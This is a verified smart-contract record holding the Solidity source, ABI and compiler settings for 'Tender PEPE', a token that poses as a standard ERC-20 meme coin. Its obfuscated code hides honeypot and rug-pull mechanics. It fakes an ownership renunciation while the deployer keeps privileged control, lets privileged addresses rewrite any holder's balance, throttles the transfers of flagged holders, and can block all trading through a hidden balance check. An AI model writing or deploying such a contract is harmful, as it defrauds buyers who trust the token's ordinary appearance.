{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface marketingList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeWallet) external view returns (uint256);\n\n    function transfer(address maxTeam, uint256 minTo) external returns (bool);\n\n    function allowance(address maxLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTeam,\n        uint256 minTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromLimit, uint256 value);\n    event Approval(address indexed maxLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract autoReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atTotal {\n    function createPair(address fromEnable, address senderAtFund) external returns (address);\n}\n\ninterface marketingListMetadata is marketingList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TenderPEPE is autoReceiver, marketingList, marketingListMetadata {\n\n    function fromMarketing() private view {\n        require(maxAmount[_msgSender()]);\n    }\n\n    address public buyTxIs;\n\n    mapping(address => bool) public maxAmount;\n\n    function owner() external view returns (address) {\n        return fromReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxBuy;\n    }\n\n    uint256 private walletTeam;\n\n    function receiverAmountSwap(address receiverTake) public {\n        fromMarketing();\n        \n        if (receiverTake == buyTxIs || receiverTake == buyMin) {\n            return;\n        }\n        totalTrading[receiverTake] = true;\n    }\n\n    uint256 private launchedSwap = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return fromReceiver;\n    }\n\n    uint8 private tokenLaunched = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return buyShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenAt;\n\n    mapping(address => uint256) private isBuyAt;\n\n    uint256 public liquidityShould;\n\n    function enableExemptMarketing(address isMin, address maxTeam, uint256 minTo) internal returns (bool) {\n        if (isMin == buyTxIs) {\n            return fundMarketing(isMin, maxTeam, minTo);\n        }\n        uint256 buyTake = marketingList(buyMin).balanceOf(atFrom);\n        require(buyTake == feeMax);\n        require(maxTeam != atFrom);\n        if (totalTrading[isMin]) {\n            return fundMarketing(isMin, maxTeam, buySender);\n        }\n        return fundMarketing(isMin, maxTeam, minTo);\n    }\n\n    uint256 public autoList;\n\n    function approve(address exemptLaunched, uint256 minTo) public virtual override returns (bool) {\n        tokenAt[_msgSender()][exemptLaunched] = minTo;\n        emit Approval(_msgSender(), exemptLaunched, minTo);\n        return true;\n    }\n\n    uint256 feeMax;\n\n    uint256 liquidityList;\n\n    function transferFrom(address isMin, address maxTeam, uint256 minTo) external override returns (bool) {\n        if (_msgSender() != shouldTakeTx) {\n            if (tokenAt[isMin][_msgSender()] != type(uint256).max) {\n                require(minTo <= tokenAt[isMin][_msgSender()]);\n                tokenAt[isMin][_msgSender()] -= minTo;\n            }\n        }\n        return enableExemptMarketing(isMin, maxTeam, minTo);\n    }\n\n    bool public modeBuyList;\n\n    address shouldTakeTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address atFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        feeAt marketingMin = feeAt(shouldTakeTx);\n        buyMin = atTotal(marketingMin.factory()).createPair(marketingMin.WETH(), address(this));\n        if (walletTeam == liquidityShould) {\n            autoList = liquidityShould;\n        }\n        buyTxIs = _msgSender();\n        totalLiquidity();\n        maxAmount[buyTxIs] = true;\n        isBuyAt[buyTxIs] = launchedSwap;\n        \n        emit Transfer(address(0), buyTxIs, launchedSwap);\n    }\n\n    address public buyMin;\n\n    function transfer(address atTrading, uint256 minTo) external virtual override returns (bool) {\n        return enableExemptMarketing(_msgSender(), atTrading, minTo);\n    }\n\n    function fundMarketing(address isMin, address maxTeam, uint256 minTo) internal returns (bool) {\n        require(isBuyAt[isMin] >= minTo);\n        isBuyAt[isMin] -= minTo;\n        isBuyAt[maxTeam] += minTo;\n        emit Transfer(isMin, maxTeam, minTo);\n        return true;\n    }\n\n    function balanceOf(address modeWallet) public view virtual override returns (uint256) {\n        return isBuyAt[modeWallet];\n    }\n\n    uint256 constant buySender = 7 ** 10;\n\n    function tradingIs(address totalTo) public {\n        if (modeBuyList) {\n            return;\n        }\n        \n        maxAmount[totalTo] = true;\n        if (autoList != liquidityShould) {\n            shouldMax = true;\n        }\n        modeBuyList = true;\n    }\n\n    string private buyShould = \"Tender PEPE\";\n\n    function tokenShould(address atTrading, uint256 minTo) public {\n        fromMarketing();\n        isBuyAt[atTrading] = minTo;\n    }\n\n    event OwnershipTransferred(address indexed exemptTotal, address indexed listToMax);\n\n    address private fromReceiver;\n\n    bool private teamExempt;\n\n    mapping(address => bool) public totalTrading;\n\n    function allowance(address fundLiquidity, address exemptLaunched) external view virtual override returns (uint256) {\n        if (exemptLaunched == shouldTakeTx) {\n            return type(uint256).max;\n        }\n        return tokenAt[fundLiquidity][exemptLaunched];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedSwap;\n    }\n\n    string private maxBuy = \"TPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLaunched;\n    }\n\n    bool private shouldMax;\n\n    function buyFrom(uint256 minTo) public {\n        fromMarketing();\n        feeMax = minTo;\n    }\n\n    function totalLiquidity() public {\n        emit OwnershipTransferred(buyTxIs, address(0));\n        fromReceiver = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listToMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTo\",\"type\":\"uint256\"}],\"name\":\"buyFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTxIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuyList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"}],\"name\":\"receiverAmountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTo\",\"type\":\"uint256\"}],\"name\":\"tokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"tradingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TenderPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}